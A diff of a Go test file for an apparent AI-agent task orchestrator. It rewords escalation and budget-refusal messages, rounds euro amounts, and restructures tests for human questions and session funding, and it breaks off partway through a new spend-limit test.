@@ -1398,7 +1398,7 @@ func TestFinishDoneFromInReview(t *testing.T) {
 // done each time a revision files its cards, keeps its issue open.
 func TestFinishDoneClosesTheIssueOfAnEndedCard(t *testing.T) {
 	merged := `{"number":12,"state":"closed","merged":true,"merge_commit_sha":"m12"}`
-	covered := `live: covered by run 5`
+	covered := `live: covered by CI run 5`
 	for _, tc := range []struct {
 		name, reason, source, track string
 		pr                          int64
@@ -1407,10 +1407,10 @@ func TestFinishDoneClosesTheIssueOfAnEndedCard(t *testing.T) {
 		closed                      []int64
 	}{
 		{"a revert, its issue open", "pull request merged by factory-merge", SourceRevert, "direct", 12, false,
-			[]string{"factoryd: pull request #12 merged; this card ends with it."}, []int64{4}},
+			[]string{"Pull request #12 merged, and this card ends with it."}, []int64{4}},
 		{"an agent card whose merge closed its issue", "pull request merged by factory-merge", "api", "direct", 12, true, nil, nil},
 		{"a covered card without a pull request", covered, SourcePlan, "direct", 0, false,
-			[]string{"factoryd: " + covered + "; this card ends with it."}, []int64{4}},
+			[]string{"Live: covered by CI run 5. This card ends with it."}, []int64{4}},
 		{"a plan card", "the plan's revision 2 filed its cards", "webhook", policy.TrackPlan, 0, false, nil, nil},
 	} {
 		fj := &prForgejo{issueOff: tc.issueOff, pulls: map[int64]string{12: merged}, labels: map[int64][]string{4: {"state/in-review"}}}
@@ -1543,7 +1543,7 @@ func TestFinishEndsAnUnmergedPullRequestDone(t *testing.T) {
 	} {
 		r, hub, store, objects := chainRunner(t, mergedCard, policy.ChainModeRun)
 		hub.pulls, hub.pullStatus = tc.pulls, map[int64]int{7: tc.status}
-		reason := `live: covered by run 5`
+		reason := `live: covered by CI run 5`
 		if _, err := execActivity(t, r, ActivityFinish, "t1", "done", reason); err != nil {
 			t.Fatalf("%s: %v", name, err)
 		}
@@ -1598,7 +1598,7 @@ func TestEndCoveredKeepsAMergedCardMergedWhenItsRecheckFails(t *testing.T) {
 	if got, _, _ := store.Task(context.Background(), "t1"); got.Status != "done" {
 		t.Fatalf("status = %q, want done", got.Status)
 	}
-	if got := taskEnds(t, objects, "t1"); !slices.Equal(got, []string{"done: live: covered by run 12"}) {
+	if got := taskEnds(t, objects, "t1"); !slices.Equal(got, []string{"done: live: covered by CI run 12"}) {
 		t.Fatalf("task_ended = %q, want one naming the run", got)
 	}
 }
@@ -1671,7 +1671,7 @@ func TestEndCoveredEndsAMergedCardDone(t *testing.T) {
 	if got, _, _ := store.Task(context.Background(), "t1"); got.Status != "done" {
 		t.Fatalf("status = %q, want done", got.Status)
 	}
-	if got := taskEnds(t, objects, "t1"); !slices.Equal(got, []string{"done: live: covered by run 12"}) {
+	if got := taskEnds(t, objects, "t1"); !slices.Equal(got, []string{"done: live: covered by CI run 12"}) {
 		t.Fatalf("task_ended = %q, want one naming the run", got)
 	}
 }
@@ -2471,10 +2471,13 @@ func TestEscalateNamesAWaitThatEndsOnItsOwn(t *testing.T) {
 // re-ask's row names the question it asks again and the live case it asks
 // in. An escalation without choices records none.
 func TestEscalateRecordsTheChoices(t *testing.T) {
-	r, store, objects := newActivityRunner(t, prTask, &prForgejo{labels: map[int64][]string{4: {"agent", "state/running"}}})
+	// a card with room for a session, so the agent's answers can happen
+	task := prTask
+	task.Process, task.BudgetEUR = "maintenance", 2
+	r, store, objects := newActivityRunner(t, task, &prForgejo{labels: map[int64][]string{4: {"agent", "state/running"}}})
 	rows := &fakeEventRecorder{}
 	r.timeline.Events = teeEvents{rows, store}
-	for _, reason := range []string{"The agent asks: Which file?\nWhy: open\nRecommendation: a.txt, it is first", HealedReason} {
+	for _, reason := range []string{"The agent asks: Which file?\nChoice: 1 (a.txt)\nWhy: open\nRecommendation: a.txt, it is first", HealedReason} {
 		if _, err := r.PgFaceStop(context.Background(), "t1", reason, []string{"a.txt", "b.txt", "ask @mallory"}); err != nil {
 			t.Fatal(err)
 		}
@@ -2494,50 +2497,49 @@ func TestEscalateRecordsTheChoices(t *testing.T) {
 	if want := []string{"701 [a.txt b.txt ask ＠mallory]", "702 [a.txt b.txt ask ＠mallory]", "703 <nil>"}; !slices.Equal(steps, want) {
 		t.Fatalf("escalated steps = %q, want %q", steps, want)
 	}
-	plainOffers := []QuestionChoice{{"say:a.txt", "a.txt"}, {"say:b.txt", "b.txt"}, {"say:ask ＠mallory", "ask ＠mallory"}, {AnswerPark, "Leave it waiting"}, {AnswerClose, "End the card"}}
-	want := []Event{
-		{Repository: "sf/repo", TaskID: "t1", IssueNumber: 4, Kind: EventQuestionAsked, Actor: FactoryDecider, Via: ViaFactoryd,
-			Detail: map[string]any{"question": "Which file?", "choices": []string{"a.txt", "b.txt", "ask ＠mallory", "Leave it waiting", "End the card"}, "comment": int64(701), "source": "agent", "case_id": int64(1),
-				"reason": "The agent asks: Which file?\nWhy: open\nRecommendation: a.txt, it is first",
-				"ask":    "Which file?", "why": "open", "info": plainInfo, "recommendation": "a.txt, it is first", "recommended_by": "the agent",
-				"offers": plainOffers}},
-		{Repository: "sf/repo", TaskID: "t1", IssueNumber: 4, Kind: EventQuestionAsked, Actor: FactoryDecider, Via: ViaFactoryd,
-			Detail: map[string]any{"question": "Which file?", "choices": sane, "comment": int64(702), "source": "supervisor", "reason": HealedReason, "case_id": int64(1),
-				"info": plainInfo, "recommendation": "a.txt, it is first", "recommended_by": "the agent", "offers": plainOffers}},
-		{Repository: "sf/repo", TaskID: "t1", IssueNumber: 4, Kind: EventQuestionAsked, Actor: FactoryDecider, Via: ViaFactoryd,
-			Detail: map[string]any{"question": "This card stopped and needs your decision: how should it go on?", "comment": int64(703), "source": "supervisor", "case_id": int64(2),
-				"reason": "supervisor escalated: the check cannot pass\n\nProgress: 3 commands",
-				"ask":    "This card stopped and needs your decision: how should it go on?",
-				"why":    "supervisor escalated: the check cannot pass", "info": plainInfo,
-				"choices": []string{"Go on", "Leave it waiting", "End the card"},
-				"offers":  []QuestionChoice{{AnswerGrant, "Go on"}, {AnswerPark, "Leave it waiting"}, {AnswerClose, "End the card"}}}},
+	if len(rows.rows) != 3 {
+		t.Fatalf("%d ask rows, want 3", len(rows.rows))
 	}
-	// every ask stores the table's offers after its own choices; the table's
-	// close and note apply on every case, and the rest of the table is the
-	// facts' (TestACaseReachesTheHumanWithItsOffersStoredAndARefusalRefreshesThem)
-	for i, row := range rows.rows {
-		offers, _ := row.Detail["offers"].([]AskOffer)
-		var own []QuestionChoice
-		var table []string
-		for _, o := range offers {
-			if o.Effect == "" {
-				own = append(own, QuestionChoice{o.Value, o.Label})
-			} else {
-				table = append(table, o.Value)
-			}
+	keys := func(d map[string]any) []string {
+		var out []string
+		for _, o := range d["offers"].([]AskOffer) {
+			out = append(out, o.Value)
 		}
-		if !slices.Contains(table, ActClose) || !slices.Contains(table, ActNote) {
-			t.Errorf("row %d stores the table offers %v, want close and note among them", i, table)
-		}
-		delete(row.Detail, "refusals")
-		if own == nil {
-			delete(row.Detail, "offers")
-		} else {
-			row.Detail["offers"] = own
+		return out
+	}
+	// the agent's ask: its question, its choices sanitised as answers in its
+	// words, and the choice it picked preselected, by the agent, on its
+	// recommendation's words
+	agent := rows.rows[0].Detail
+	if agent["question"] != "Which file?" || agent["ask"] != "Which file?" || agent["why"] != "Open." || agent["source"] != "agent" ||
+		agent["case_id"] != int64(1) || agent["comment"] != int64(701) || !reflect.DeepEqual(agent["choices"], sane) {
+		t.Errorf("the agent's ask row = %+v", agent)
+	}
+	if got, want := keys(agent), []string{"say:a.txt", "say:b.txt", "say:ask ＠mallory", ActNote}; !slices.Equal(got, want) {
+		t.Errorf("the agent's ask offers %v, want %v", got, want)
+	}
+	if story, _ := agent["story"].(Story); agent["recommended_by"] != "the agent" || agent["recommendation"] != "a.txt, it is first" ||
+		!reflect.DeepEqual(agent["preselected"], map[string]any{"action": "say:a.txt"}) || story.View != "" {
+		t.Errorf("the agent's suggestion: by %v, %v, %v, view %q", agent["recommended_by"], agent["recommendation"], agent["preselected"], story.View)
+	}
+	// the healed re-ask names the question it asks again and carries the face
+	healed := rows.rows[1].Detail
+	if healed["question"] != "Which file?" || healed["reason"] != HealedReason || healed["case_id"] != int64(1) || !reflect.DeepEqual(healed["choices"], sane) {
+		t.Errorf("the healed row = %+v", healed)
+	}
+	for _, k := range []string{"ask", "why", "story", "offers", "recommendation", "recommended_by"} {
+		if !reflect.DeepEqual(healed[k], agent[k]) {
+			t.Errorf("the healed row's %s = %v, want the asked face's %v", k, healed[k], agent[k])
 		}
 	}
-	if !reflect.DeepEqual(rows.rows, want) {
-		t.Fatalf("rows = %+v, want %+v", rows.rows, want)
+	// a stop with no choices asks the register's question of its kind, and
+	// its face holds the close and the note every case takes
+	plain := rows.rows[2].Detail
+	if plain["question"] != plain["ask"] || plain["ask"] != CaseFaces[CaseOther].Ask(Facts{}) || plain["case_id"] != int64(2) || plain["choices"] != nil {
+		t.Errorf("the plain ask row = %+v", plain)
+	}
+	if got := keys(plain); !slices.Contains(got, ActClose) || !slices.Contains(got, ActNote) {
+		t.Errorf("the plain ask offers %v, want the close and the note among them", got)
 	}
 }
 
@@ -2554,7 +2556,7 @@ func TestRerunChecksPushesOneEmptyCommit(t *testing.T) {
 		}
 	}
 	if len(fj.contents) != 1 || fj.contents[0]["branch"] != "factory/t1" || fmt.Sprint(fj.contents[0]["files"]) != "[]" ||
-		fj.contents[0]["message"] != "factoryd: run the checks of c1 again\n\nFactory-Role: checks\nFactory-Task: t1\n" {
+		fj.contents[0]["message"] != "Run the checks of c1 again\n\nFactory-Role: checks\nFactory-Task: t1\n" {
 		t.Fatalf("commits = %v, want one empty commit on factory/t1", fj.contents)
 	}
 }
@@ -2668,7 +2670,7 @@ func TestFaceAsksAHumanOnTheIssue(t *testing.T) {
 	if labels := fj.labels[4]; !slices.Equal(labels, []string{"agent", "state/waiting-human"}) {
 		t.Fatalf("labels = %v", labels)
 	}
-	if id != 701 || len(fj.comments) != 1 || !strings.Contains(fj.comments[0], "the check cannot pass") || !strings.Contains(fj.comments[0], "Reply on this issue") {
+	if id != 701 || len(fj.comments) != 1 || !strings.Contains(fj.comments[0], "The check cannot pass.") || !strings.Contains(fj.comments[0], "Reply on this issue") {
 		t.Fatalf("id = %d, comments = %q", id, fj.comments)
 	}
 	timeline, _ := objects.Get(context.Background(), "sessions/t1/timeline.jsonl")
@@ -2707,8 +2709,7 @@ func TestEscalateATaskWithoutAnIssue(t *testing.T) {
 
 // A session that stops on a tool refusal puts the refusal in its ask's
 // info block, verbatim: the blocker reaches the human without
-// agent-side reporting (card #1345). A plan card's stop names what its
-// choices do on the plan track, and a session whose last tool call
+// agent-side reporting (card #1345), and a session whose last tool call
 // completed quotes nothing.
 func TestEscalateQuotesTheLastToolRefusal(t *testing.T) {
 	const refusal = "Refused: criterion t-c1: gh is not an allowed tool; criterion t-c2: the tool holds no issue write"
@@ -2739,9 +2740,6 @@ func TestEscalateQuotesTheLastToolRefusal(t *testing.T) {
 			t.Fatal(err)
 		}
 		q := questionOfAsk(rows.rows[0].Detail)
-		if !strings.Contains(q.Info, "planner session") || strings.Contains(q.Info, "pull request") {
-			t.Errorf("%s: info = %q, want the plan track's wording", c.name, q.Info)
-		}
 		if c.wantIn != "" && !strings.Contains(q.Info, c.wantIn) {
 			t.Errorf("%s: info = %q, want the refusal verbatim", c.name, q.Info)
 		}
@@ -3501,12 +3499,12 @@ func TestMonthTurn(t *testing.T) {
 			t.Errorf("monthTurn(%v) = %v, want %v", tc.at, got, tc.want)
 		}
 	}
-	if got := capTurn(policy.RefusedDayCap, oct(14, 20, 43)); !got.Equal(oct(15, 0, 0)) {
-		t.Errorf("capTurn at the day cap = %v, want the day's turn", got)
+	if got := CapTurn(policy.RefusedDayCap, oct(14, 20, 43)); !got.Equal(oct(15, 0, 0)) {
+		t.Errorf("CapTurn at the day cap = %v, want the day's turn", got)
 	}
 	for _, d := range []string{policy.RefusedMonthCap, policy.RefusedProjectCap} {
-		if got := capTurn(d, time.Date(2026, 12, 31, 23, 59, 0, 0, time.UTC)); !got.Equal(jan1) {
-			t.Errorf("capTurn(%s) = %v, want January 1", d, got)
+		if got := CapTurn(d, time.Date(2026, 12, 31, 23, 59, 0, 0, time.UTC)); !got.Equal(jan1) {
+			t.Errorf("CapTurn(%s) = %v, want January 1", d, got)
 		}
 	}
 }
@@ -3517,19 +3515,19 @@ func TestMonthTurn(t *testing.T) {
 // characters, for a project of a realistic name.
 func TestCapWaitReason(t *testing.T) {
 	nov1 := time.Date(2026, 11, 1, 0, 0, 0, 0, time.UTC)
-	day := "free headroom -23.439417 EUR (task 2.000000, day -23.439417, month 54.546612)"
+	day := "free headroom -23.44 EUR (task 2.00, day -23.44, month 54.55)"
 	if got := CapWaitReason(policy.RefusedDayCap, capGateway(policy.RefusedDayCap), day, oct(15, 0, 0)); got != dayReason {
 		t.Errorf("day reason = %q, want %q", got, dayReason)
 	}
-	const month = "the month cap is reached: the card resumes on its own once the month's free headroom funds a session, " +
-		"at the latest when the UTC month turns at 2026-11-01T00:00:00Z. Raise budget.month_eur in policy.yaml to resume it sooner, or close the card.\n" +
+	const month = "the month cap is reached: the card resumes on its own once the money left under the month cap funds a session, " +
+		"at the latest when the UTC month turns at 2026-11-01T00:00:00Z. Raise the month cap in policy.yaml to resume it sooner, or close the card.\n" +
 		"the gateway refused this task's spend (refused_month_cap): spent"
 	if got := CapWaitReason(policy.RefusedMonthCap, capGateway(policy.RefusedMonthCap), "spent", nov1); got != month {
 		t.Errorf("month reason = %q, want %q", got, month)
 	}
-	state := "0.010000 EUR of the project's 3.00 EUR month (budget.month_eur in projects/linkshort.yaml) is free"
-	const project = "the project's month cap is reached: the card resumes on its own once the project's free month headroom funds a session, " +
-		"at the latest when the UTC month turns at 2026-11-01T00:00:00Z. Raise budget.month_eur in projects/linkshort.yaml to resume it sooner, or close the card.\n" +
+	state := "0.01 EUR of the project's 3.00 EUR month in projects/linkshort.yaml is free"
+	const project = "the project's month cap is reached: the card resumes on its own once the money left under the project's month cap funds a session, " +
+		"at the latest when the UTC month turns at 2026-11-01T00:00:00Z. Raise the project's month cap in projects/linkshort.yaml to resume it sooner, or close the card.\n" +
 		"the attempt's floor refused the attempt before it started (refused_project_cap): "
 	got := CapWaitReason(policy.RefusedProjectCap, capFloor(policy.RefusedProjectCap), state, nov1)
 	if got != project+state {
@@ -3539,7 +3537,7 @@ func TestCapWaitReason(t *testing.T) {
 		t.Errorf("project question row = %q (%d), want the actions within 300 characters", q, len(q))
 	}
 	noFile := CapWaitReason(policy.RefusedProjectCap, capGateway(policy.RefusedProjectCap), "spent", nov1)
-	if want := "Raise budget.month_eur in the project's file to resume it sooner"; !strings.Contains(noFile, want) {
+	if want := "Raise the project's month cap in the project's file to resume it sooner"; !strings.Contains(noFile, want) {
 		t.Errorf("project reason without a file = %q, want %q", noFile, want)
 	}
 }
@@ -3558,9 +3556,6 @@ func TestCapReasonReaders(t *testing.T) {
 		if got := capWaitDecision(resumes); got != decision {
 			t.Errorf("%s: capWaitDecision = %q", decision, got)
 		}
-		if got := capRefusedSuffix(resumes); got != "the state: x" {
-			t.Errorf("%s: suffix of the wait on its own = %q", decision, got)
-		}
 		if decision == policy.RefusedDayCap {
 			continue
 		}
@@ -3570,9 +3565,6 @@ func TestCapReasonReaders(t *testing.T) {
 		}
 		if got := capWaitDecision(human); got != "" {
 			t.Errorf("%s: capWaitDecision of the wait on a human = %q, want none", decision, got)
-		}
-		if got := capRefusedSuffix(human); got != "the state: x" {
-			t.Errorf("%s: suffix of the wait on a human = %q", decision, got)
 		}
 	}
 	if want := "the month cap is reached: the gateway refused this task's spend (refused_month_cap): why"; capRefused(policy.Refusal{Decision: policy.RefusedMonthCap, Reason: "why"}) != want {
@@ -3667,20 +3659,20 @@ func TestSessionFundedPricesASessionsOpening(t *testing.T) {
 	ctx := context.Background()
 
 	why, err := r.SessionFunded(ctx, "t-704", "factory/big")
-	if want := BudgetRefused + ": Raise the budget (Fund on the board) and answer, or close the card.\n" +
-		"The card spent 4.89 EUR of its 5.00 EUR budget; 0.11 EUR is held for the review and the audit, which need 0.40 EUR, " +
-		"and a session's opening on factory/big needs 0.607001 EUR " +
-		"(2 calls at once: 44342 bytes on big asking 24576 output tokens, 7031 bytes on small asking 24576 output tokens; " +
-		"the largest of the newest 2 sessions' openings on it, as the holds take them), " +
-		"so a fund of 0.90 EUR opens it; a session started now could not make its opening calls."; err != nil || why != want || !BudgetRefusal(why) {
+	if want := BudgetRefused + ": Raise the budget and answer, or close the card.\n" +
+		"The card spent 4.89 EUR of its 5.00 EUR budget, 0.11 EUR is held for the review and the audit, which need 0.40 EUR, " +
+		"and a session's opening on factory/big needs 0.61 EUR " +
+		"(2 calls at once: 44342 bytes on big asking 24576 output tokens, 7031 bytes on small asking 24576 output tokens, " +
+		"the largest of the newest 2 sessions' openings on it, as the holds take them). " +
+		"A session started now could not make its opening calls."; err != nil || why != want || !BudgetRefusal(why) {
 		t.Fatalf("the fund's floor = (%q, %v), want %q", why, err, want)
 	}
 
 	raised := store.tasks["t-704"]
 	raised.BudgetEUR = 5.6
 	store.tasks["t-704"] = raised
-	if why, err := r.SessionFunded(ctx, "t-704", "factory/big"); err != nil || !strings.Contains(why, "The card spent 4.89 EUR of its 5.60 EUR budget; 0.40 EUR is held for the review and the audit, which need 0.40 EUR") ||
-		!strings.Contains(why, "so a fund of 0.30 EUR opens it") {
+	if why, err := r.SessionFunded(ctx, "t-704", "factory/big"); err != nil || !strings.Contains(why, "The card spent 4.89 EUR of its 5.60 EUR budget, 0.40 EUR is held for the review and the audit, which need 0.40 EUR") ||
+		!BudgetRefusal(why) {
 		t.Fatalf("0.31 under the ceiling: (%q, %v), want the opening refused", why, err)
 	}
 	calibrated := slices.Clone(s1)
@@ -3701,14 +3693,14 @@ func TestSessionFundedPricesASessionsOpening(t *testing.T) {
 	store.tasks["t-704"] = raised
 	store.openings["big"] = policy.Opening{Sessions: [][]policy.OpeningCall{s2}, AnyRef: true}
 	if why, err := r.SessionFunded(ctx, "t-704", "factory/big"); err != nil ||
-		!strings.Contains(why, "needs 0.499689 EUR (43683 bytes on big asking 24576 output tokens; the largest of the newest 1 sessions' openings on any model, none on it being recorded") {
+		!strings.Contains(why, "needs 0.50 EUR (43683 bytes on big asking 24576 output tokens, the largest of the newest 1 sessions' openings on any model, none on it being recorded") {
 		t.Fatalf("measured on any alias: (%q, %v)", why, err)
 	}
 	store.openings["big"] = policy.Opening{AnyRef: true}
 	raised.SpentEUR = 4.995
 	store.tasks["t-704"] = raised
 	if why, err := r.SessionFunded(ctx, "t-704", "factory/big"); err != nil ||
-		!strings.Contains(why, "needs 0.015360 EUR (no session's opening is recorded: 1024 output tokens at the hold machinery's minimum)") {
+		!strings.Contains(why, "needs 0.02 EUR (no session's opening is recorded: 1024 output tokens at the hold machinery's minimum)") {
 		t.Fatalf("nothing measured: (%q, %v)", why, err)
 	}
 }
@@ -3735,13 +3727,13 @@ func TestSessionFundedAsksTheFloorOfTheRung(t *testing.T) {
 	ctx := context.Background()
 
 	why, err := r.SessionFunded(ctx, "t-1", "factory/big")
-	if err != nil || !BudgetRefusal(why) || !strings.Contains(why, "The card spent 4.50 EUR of its 5.00 EUR budget; 0.10 EUR is held for the review and the audit, which need 0.10 EUR, and a session on factory/big needs 0.600000 EUR "+
-		"(the floor of its rung, budget.session_floor_frontier_eur in policy.yaml), so a fund of 0.20 EUR opens it; a session started now would run out of money before its work is done.") {
-		t.Fatalf("frontier at 0.40 under the ceiling = (%q, %v), want the 0.600000 EUR floor named", why, err)
+	if err != nil || !BudgetRefusal(why) || !strings.Contains(why, "The card spent 4.50 EUR of its 5.00 EUR budget, 0.10 EUR is held for the review and the audit, which need 0.10 EUR, and a session on factory/big needs 0.60 EUR "+
+		"(the session floor of its model, budget.session_floor_frontier_eur in policy.yaml). A session started now would run out of money before its work is done.") {
+		t.Fatalf("frontier at 0.40 under the ceiling = (%q, %v), want the 0.60 EUR floor named", why, err)
 	}
 	if why, err := r.SessionFunded(ctx, "t-1", "big"); err != nil || !BudgetRefusal(why) ||
-		!strings.Contains(why, "a session on big needs 0.600000 EUR (the floor of its rung, budget.session_floor_frontier_eur in policy.yaml)") {
-		t.Fatalf("unprefixed frontier at 0.50 free = (%q, %v), want the 0.600000 EUR floor named", why, err)
+		!strings.Contains(why, "a session on big needs 0.60 EUR (the session floor of its model, budget.session_floor_frontier_eur in policy.yaml)") {
+		t.Fatalf("unprefixed frontier at 0.50 free = (%q, %v), want the 0.60 EUR floor named", why, err)
 	}
 	if why, err := r.SessionFunded(ctx, "t-1", "factory/small"); err != nil || why != "" {
 		t.Fatalf("cheap at 0.40 under the ceiling = (%q, %v), want funded", why, err)
@@ -3750,12 +3742,12 @@ func TestSessionFundedAsksTheFloorOfTheRung(t *testing.T) {
 	raised.SpentEUR = 4.8
 	store.tasks["t-1"] = raised
 	if why, err := r.SessionFunded(ctx, "t-1", "factory/small"); err != nil ||
-		!strings.Contains(why, "a session on factory/small needs 0.300000 EUR (the floor of its rung, budget.session_floor_cheap_eur in policy.yaml)") {
-		t.Fatalf("cheap at 0.20 free = (%q, %v), want the 0.300000 EUR floor named", why, err)
+		!strings.Contains(why, "a session on factory/small needs 0.30 EUR (the session floor of its model, budget.session_floor_cheap_eur in policy.yaml)") {
+		t.Fatalf("cheap at 0.20 free = (%q, %v), want the 0.30 EUR floor named", why, err)
 	}
 	v.Tree.Document.Budget.SessionFloorCheapEUR = 0
 	if why, err := r.SessionFunded(ctx, "t-1", "factory/small"); err != nil || why != "" {
-		t.Fatalf("cheap without a floor at 0.10 under the ceiling = (%q, %v), want the opening alone to decide (0.01536 EUR)", why, err)
+		t.Fatalf("cheap without a floor at 0.10 under the ceiling = (%q, %v), want the opening alone to decide (0.02 EUR)", why, err)
 	}
 }
 
@@ -3780,7 +3772,7 @@ func TestSessionFundedPricesTheClassSessionModel(t *testing.T) {
 		Policy: func() policy.Version { return v },
 		Models: ModelLadder{Start: "factory/small", Stronger: "factory/big"}}}
 	why, err := r.SessionFunded(context.Background(), "t-2", "factory/big")
-	if err != nil || !strings.Contains(why, "a session on factory/premium needs 0.600000 EUR (the floor of its rung, budget.session_floor_frontier_eur in policy.yaml)") {
+	if err != nil || !strings.Contains(why, "a session on factory/premium needs 0.60 EUR (the session floor of its model, budget.session_floor_frontier_eur in policy.yaml)") {
 		t.Fatalf("premium plan session at 0.50 free = (%q, %v), want the frontier floor on factory/premium", why, err)
 	}
 	if got := sessionModel(v.Document, Task{RequiredCapabilities: []string{"coder"}}, "factory/small"); got != "factory/small" {
@@ -3801,14 +3793,12 @@ func TestSessionFundedPricesTheClassSessionModel(t *testing.T) {
 // spent 0.10 is held and the ceiling -0.30: 0.90. With no hold and
 // 4.5004 spent, the ceiling 0.0996 is read down to 0.099, never up to
 // 0.100, so the raise is 0.60 - 0.099 = 0.501, rounded up to 0.51, and at
-// 5.51 (0.6096) the floor funds the session. The floor 0.60 is a button
-// only while the raise stays under it: at 0.65 and 0.90 a fund of it
-// would leave the session refused, so those asks offer the raise and the
-// round 2.00 alone.
+// 5.51 (0.6096) the floor funds the session. The face's why names the
+// raise, and "Add money" opens with it.
 func TestBudgetAskFirstRaiseFundsTheSession(t *testing.T) {
 	store := newFakeStore()
 	if err := store.CreateTask(context.Background(), Task{ID: "t-2", Status: "waiting-human", BudgetEUR: 5, SpentEUR: 4.5, Track: "plan",
-		RequiredCapabilities: []string{"planner"}}); err != nil {
+		RequiredCapabilities: []string{"planner"}, CeilingEUR: 10}); err != nil {
 		t.Fatal(err)
 	}
 	store.held = map[string]policy.TaskFree{"t-2": {Held: 0.4, Holds: 1, Expires: time.Date(2026, 10, 14, 19, 35, 3, 0, time.UTC)}}
@@ -3818,12 +3808,12 @@ func TestBudgetAskFirstRaiseFundsTheSession(t *testing.T) {
 	v.Tree.Document.Classes["planner"] = policy.Class{Session: policy.SessionPlan, Models: []string{policy.Small, policy.Big, policy.Premium},
 		SessionModel: policy.Premium}
 	v.Tree.Document.Prices.MaxOutputTokens[policy.Premium] = 32768
-	r := &Runner{store: store, cfg: RunnerConfig{
+	r := &Runner{store: store, objects: &fakeObjectStore{}, cfg: RunnerConfig{
 		Prices: stubPrices{price: policy.Price{In: 3e-6, CacheRead: 3e-7, Out: 1.5e-5, MaxOutput: 32768}},
 		Policy: func() policy.Version { return v },
 		Models: ModelLadder{Start: "factory/small", Stronger: "factory/big"}}}
 	ctx := context.Background()
-	ask := func(budget, spent float64, want string, choices ...float64) {
+	ask := func(budget, spent, raise float64) {
 		t.Helper()
 		k := store.tasks["t-2"]
 		k.BudgetEUR, k.SpentEUR, k.HeldEUR = budget, spent, store.held["t-2"].Held
@@ -3832,47 +3822,98 @@ func TestBudgetAskFirstRaiseFundsTheSession(t *testing.T) {
 		if err != nil || !BudgetRefusal(why) {
 			t.Fatalf("%.4f of %.2f spent: (%q, %v), want the money ask", spent, budget, why, err)
 		}
-		q := BudgetQuestion(why, r.questionFacts(ctx, k, why))
-		if q.Ask != want {
-			t.Errorf("%.4f of %.2f spent: ask = %q, want %q", spent, budget, q.Ask, want)
-		}
-		var wantChoices []QuestionChoice
-		for _, eur := range choices {
-			wantChoices = append(wantChoices, QuestionChoice{FundChoiceValue(eur), fmt.Sprintf("Fund %.2f EUR and go on", eur)})
-		}
-		if wantChoices = append(wantChoices, QuestionChoice{AnswerPark, "Park it"}); !slices.Equal(q.Choices, wantChoices) {
-			t.Errorf("%.4f of %.2f spent: choices = %v, want %v", spent, budget, q.Choices, wantChoices)
-		}
-		first, err := strconv.ParseFloat(strings.TrimPrefix(q.Choices[0].Value, AnswerFund+":"), 64)
+		f, err := r.tripFacts(ctx, k, "", "factory/big")
 		if err != nil {
 			t.Fatal(err)
 		}
-		k.BudgetEUR += first
+		facts := Facts{CaseFacts: f, Card: k}
+		face := FaceOf(Case{Kind: CaseBudgetFloor, Facts: map[string]any{"reason": why}}, facts)
+		if want := fmt.Sprintf("the card needs %.2f EUR more to pay its next session", raise); !strings.Contains(face.Why, want) {
+			t.Errorf("%.4f of %.2f spent: why = %q, want it to name %q", spent, budget, face.Why, want)
+		}
+		if eur := pressedFund(t, facts); eur != raise {
+			t.Fatalf("%.4f of %.2f spent: Add money opens with %.2f, want %.2f", spent, budget, eur, raise)
+		}
+		k.BudgetEUR += raise
 		store.tasks["t-2"] = k
 		if why, err := r.SessionFunded(ctx, "t-2", "factory/big"); err != nil || why != "" {
 			t.Errorf("%.4f of %.2f spent after the first raise: (%q, %v), want the session funded", spent, k.BudgetEUR, why, err)
 		}
 	}
 
-	ask(5, 3.8, "The card spent €3.80 of its €5.00 budget, €0.40 is held by calls in flight, €0.40 is held for the review and the audit, which need €0.40, and one more session on factory/premium needs €0.600000. Fund it, or park it?", 0.2, 0.6, 2)
-	ask(5, 4.25, "The card spent €4.25 of its €5.00 budget, €0.40 is held by calls in flight, €0.35 is held for the review and the audit, which need €0.40, and one more session on factory/premium needs €0.600000. Fund it, or park it?", 0.65, 2)
+	ask(5, 3.8, 0.2)
+	ask(5, 4.25, 0.65)
 	k := store.tasks["t-2"]
 	k.BudgetEUR, k.SpentEUR = 5, 4.5
 	store.tasks["t-2"] = k
 	why, err := r.SessionFunded(ctx, "t-2", "factory/big")
 	if want := BudgetRefused + ": Wait for the holds to settle and answer (a released hold books its call's cost, " +
-		"an expired one is booked in full), or raise the budget (Fund on the board) and answer.\n" +
-		"The card spent 4.50 EUR of its 5.00 EUR budget; 0.400 EUR is held by calls in flight (1, the earliest expiring 2026-10-14T19:35:03Z); " +
+		"an expired one is booked in full), or raise the budget and answer.\n" +
+		"The card spent 4.50 EUR of its 5.00 EUR budget, 0.40 EUR is held by calls in flight (1, the earliest expiring 2026-10-14T19:35:03Z), " +
 		"0.10 EUR is held for the review and the audit, which need 0.40 EUR, " +
-		"and a session on factory/premium needs 0.600000 EUR (the floor of its rung, budget.session_floor_frontier_eur in policy.yaml), " +
-		"so a fund of 0.90 EUR opens it; a session started now would run out of money before its work is done."; err != nil || why != want {
+		"and a session on factory/premium needs 0.60 EUR (the session floor of its model, budget.session_floor_frontier_eur in policy.yaml). " +
+		"A session started now would run out of money before its work is done."; err != nil || why != want {
 		t.Errorf("the held refusal = (%q, %v), want %q", why, err, want)
 	}
 
-	ask(5, 4.5, "The card spent €4.50 of its €5.00 budget, €0.40 is held by calls in flight, €0.10 is held for the review and the audit, which need €0.40, and one more session on factory/premium needs €0.600000. Fund it, or park it?", 0.9, 2)
+	ask(5, 4.5, 0.9)
 
 	store.held = nil
-	ask(5, 4.5004, "The card spent €4.50 of its €5.00 budget, €0.40 is held for the review and the audit, which need €0.40, and one more session on factory/premium needs €0.600000. Fund it, or park it?", 0.51, 0.6, 2)
+	ask(5, 4.5004, 0.51)
+}
+
+// At its spend limit a card out of money is let go on by one press of
+// "Raise the spend limit": 4.50 of 5.00 EUR spent with the limit at 5.00,
+// a session on factory/big needs 0.60 EUR and the review and the audit
+// 0.40 EUR, so 0.50 EUR is short. The press raises the limit by 0.50 EUR
+// and adds 0.50 EUR, and the next session is funded.
+func TestARaiseAtTheSpendLimitFundsTheNextSession(t *testing.T) {
+	store := newFakeStore()
+	if err := store.CreateTask(context.Background(), Task{ID: "t-3", Status: "waiting-human", BudgetEUR: 5, SpentEUR: 4.5, Track: "plan",
+		RequiredCapabilities: []string{"planner"}, CeilingEUR: 5}); err != nil {
+		t.Fatal(err)
+	}
+	v := testPolicyVersion()
+	v.Tree.Document.Budget.SessionFloorCheapEUR = 0.3
+	v.Tree.Document.Budget.SessionFloorFrontierEUR = 0.6
+	v.Tree.Document.Classes["planner"] = policy.Class{Session: policy.SessionPlan, Models: []string{policy.Small, policy.Big, policy.Premium},
+		SessionModel: policy.Premium}
